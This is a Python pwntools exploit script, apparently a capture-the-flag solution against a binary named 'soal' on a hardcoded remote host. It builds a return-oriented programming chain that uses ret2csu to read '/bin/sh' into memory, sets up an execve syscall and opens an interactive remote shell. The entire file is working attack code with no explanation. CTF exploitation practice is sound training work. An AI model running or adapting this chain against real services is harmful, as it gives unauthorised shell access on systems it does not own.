from pwn import *
 
def neg(x):
   return 2**64-x
 
b = ELF("./soal")

# r = process("./soal")

# r = remote("localhost",13308)
r = remote("104.248.150.36",13304)

# gdb.attach(r,"""
# 	b *0x00000000004012b6
# 	b *0x000000000040130c
# 	b *0x000000000040130d
# 	b *0x00000000004011c9
# 	b *0x00000000004011d4
# 	c
# 	""")

bss = 0x404050
pop_rdx = 0x00000000004011c7
pop_rsi_r15 = 0x0000000000401369
pop_rdi = 0x000000000040136b
syscall = 0x00000000004011c9

# disass __libc_csu_init
pop_csu = 0x0000000000401362
ret2csu = 0x0000000000401348
# x <= 255 and 0x4011c3 <= x <= 0x40137d  and  0x404050 <= x <= 0x4040a8
# read 0x404028-0x404050
p = ''
# p += p64(pop_rdi)
p += p64(1)*9
# # ret2csu to call read()
p += p64(pop_csu)
p += p64(neg(5)) # rbx
p += p64(neg(5)+1) # rbp
p += p64(0) # r12 => edi
p += p64(bss) # r13 => rsi
p += p64(200) # r14 => rdx 
p += p64(0x404050) # r15 => call
p += p64(ret2csu)
p += p64(0)*7 # pop
 
# syscall execve("/bin/sh", 0, 0)
# set RAX=59
p += p64(pop_rsi_r15)
p += p64(59)*2
# p += p64(10)
p += p64(pop_rdi)
p += p64(1)
p += p64(b.symbols['max'])
 
# # set execve args
p += p64(pop_rdx)
p += p64(0)
p += p64(pop_rsi_r15)
p += p64(0)*2
p += p64(pop_rdi)
p += p64(bss)
p += p64(syscall)

p = p.ljust(1000,"\x00")
r.send(p)
r.send("/bin/sh\x00")
 
r.interactive()